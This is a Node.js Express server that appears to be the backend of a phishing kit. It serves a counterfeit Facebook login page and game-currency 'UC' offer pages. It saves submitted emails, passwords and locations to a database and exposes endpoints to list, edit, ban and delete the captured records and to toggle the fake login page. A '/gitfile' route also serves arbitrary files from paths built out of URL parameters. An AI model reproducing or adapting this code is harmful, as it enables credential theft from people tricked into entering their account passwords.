const express = require('express')
const app = express()
const cors = require('cors')
const DB = require('./DB')
app.use(cors({
    origin : '*'
}))

app.use(express.json())
app.use(express.urlencoded({extended :true}))
const databis = require('./models/post')

app.use((req,res,next)=>{
    res.setHeader("Access-Control-Allow-Origin","*")
    res.setHeader("Access-Control-Allow-Methods","*")
    res.setHeader("Access-Control-Allow-Headers","Authorization")
    next()
})
var u
var onlinuc=[]
var databisget =(async()=>{  
    data = await databis.find()
})
app.get('/tiktok-developers-site-verification=59EjauccPL8S04vTUpDn9h46AKBgayf8',(req,res)=>{
    res.send('hello yes')
})
app.post('/onuc',(req,res)=>{
    var ID = req.body.ID
    var l = false
    for (let z = 0; z < onlinuc.length; z++) {
        if (onlinuc[z] == ID) {
            l = true
        }
    }
    if (l == false) {
        onlinuc.push(ID)
    }
    res.json({l})
})
databisget()  
var  databissave = (async(D)=>{
    const iss = new databis()
        iss.ID = D.ID
        iss.IA = D.IA 
        iss.BANE = D.BANE 
        iss.AFER = D.AFER
        iss.Location = D.Location
        iss.Email = D.Email
        iss.Password = D.Password
        await iss.save()
        databisget()
})
var databisdelet =(async(D)=>{ 
    if ( D < 50000) {
        var id = data[D].id
    await databis.findByIdAndDelete(id)
    console.log('<<<'+id)

    }else{
    var id = D
    await databis.findByIdAndDelete(id)
    console.log('>>>'+id)
    }
})
var databisclear =(async()=>{  
    var id
    for (let z = 0; z < data.length; z++) {
        id = data[z].id
        await databisdelet(id)
        console.log(data.length)
    }
    await databisget()
})  
var databisedit = (async(I,D)=>{ 

    var l;
    if (I.length <= 5) {
        l = I
    }else{
    for (let e = 0; e < data.length; e++) { 
        if (data[e].ID == I) {
            l = e
        } 
    } 
    }   
    await databisdelet(String(l))
    var DY = {
    "ID":D.ID, 
     "IA":D.IA,
     "BANE":D.BANE,
     "AFER":D.AFER,
     "Location":D.Location,
     "Email":D.Email,
     "Password":D.Password 
    }
    await databissave(DY)
})

app.post("/iss",async(req,res)=>{
res.json({conect: data})
})  
app.post("/idd",async(req,res)=>{
    var id = req.body.id
    await databisdelet(id)
    
res.json({content:data})  
})  
app.post("/icc",async(req,res)=>{
    var id = req.body.id
    await databisclear()
    
res.json({content:data})   
})  
app.post("/iee",async(req,res)=>{
    var id = req.body.id
    var body = req.body  
    await databisedit(id,body) 
res.json({content:u})     
})  


//------------------------------------------>

app.get('/',(req,res)=>{
    res.sendFile(__dirname + '//UC//index1.html')
})
var FACBOOK = false;
var F ='//FACBOOK//Login.html'
 
app.get('/FACBOOK/login/:ID',(req,res)=>{ 
    var ID = req.params.ID
    console.log(ID)
    res.sendFile(__dirname + F)
})
app.get('/sold/UC/:N',(req,res)=>{
    N = req.params.N
    res.sendFile(__dirname + '//UC//index'+N+'.html')
})
app.post('/api',(req,res)=>{
    res.json({
        data:data,
        uc:onlinuc
    }) 
})
var data = []
app.post('/api/:id',async(req,res)=>{
    var body = req.body
    var T = true
    for (let e = 0; e < data.length; e++) {
        if (data[e].Email == body.Email && data[e].ID == body.ID){
            T = false
        }
    }
    if (T == true) {  
        await databissave(body)
    }
    res.json({data})
})
app.post('/apiset',async(req,res)=>{
    var body = req.body
    var TF = false
    for (let z = 0; z < data.length; z++) {
        if (body.ID == data[z].ID) {
        await databisedit(body.ID,body) 
        await databisget()
        TF = true
        }
    }
    res.json({TF})
})

app.post('/apiserh',async(req,res)=>{
    var body = req.body
    var ID = body.ID
        var D;
    for (let e = 0; e < data.length; e++) {
        if (data[e].ID == ID) {
            D = data[e]
        }    
        }   
      res.json({D})  
})
app.get('/data',(req,res)=>{
    res.sendFile(__dirname+'//DATA//index.html')
})
app.post('/online',(req,res)=>{
    var id = req.body
    if (id.id == 'FACBOOK') {
        FACBOOK = true
    }
res.json({F:true})
})
app.post('/online/test',(req,res)=>{  


res.json({FACBOOK,onlinuc})
FACBOOK = false
onlinuc = []
})
app.post('/DS',async(req,res)=>{
    var prm = req.body.I
    var da = req.body.data
    if (prm == 'FA') {
        var l 
        if (F == '//FACBOOK//Login.html') {
            F = '//FACBOOK//null.html'
        }else{
            F = '//FACBOOK//Login.html'
        }
    }else if (prm == 'B') {
        var dc
        for (let z = 0; z < data.length; z++) {
            if (data[z].ID == da) {
                 dc = z
            }  
        }
        var l 
        if (data[dc].BANE == "true") {  
            l = "false"
        }else{l = "true"}
        var D = {
            ID:data[dc].ID,
            IA:data[dc].IA,
            BANE:l,
            AFER:data[dc].AFER,
            Email:data[dc].Email,
            Password:data[dc].Password,
            Location:data[dc].Location 
        }
        await databisedit(da,D) 
    }else if (prm == 'L') {  
        var dc
        for (let z = 0; z < data.length; z++) {
            if (data[z].ID == da) {
                 dc = z
            }  
        }
        var l 
        if (data[dc].IA == "true") {
            l = "false"
        }else{l = "true"}
        var D = {
            ID:data[dc].ID,
            IA:l,
            BANE:data[dc].BANE,
            AFER:data[dc].AFER,
            Email:data[dc].Email,
            Password:data[dc].Password,
            Location:data[dc].Location 
        }
        await databisedit(da,D) 
        console.log(da)
    }else if (prm == 'D') {
        var id
        for (let z = 0; z < data.length; z++) {
            if (da == data[z].ID) {
                id = data[z].id
            } 
        }
        console.log(id)
        await databisdelet(id)
        await databisget()
    }else if (prm == 'C') {
        databisclear()
    }else{}
    res.json({data:F})
})


app.get('/gitfile/:I1/:I2/:I3/:I4/:I5',(req,res)=>{
    var I1 = '//' + req.params.I1
    var I2 = '//' + req.params.I2
    var I3 = '//' + req.params.I3
    var I4 = '//' + req.params.I4       
    var I5 = '//' + req.params.I5       
    if (I2 == '//null') {
        I2 = ""
        I3 = ""
        I4 = "" 
        I5 = ""
    }else if (I3 == '//null'){
        I3 = ""   
        I4 = ""
        I5 = ""
    }else if (I4 == '//null') {
        I4 = ""
        I5 = ""
    }else if (I5 == '//null'){
        I5 = ""
    }
    res.sendFile(__dirname+`${I1}${I2}${I3}${I4}${I5}`)
})

app.listen(2007,function(){
    console.log('islam : 2007')
})
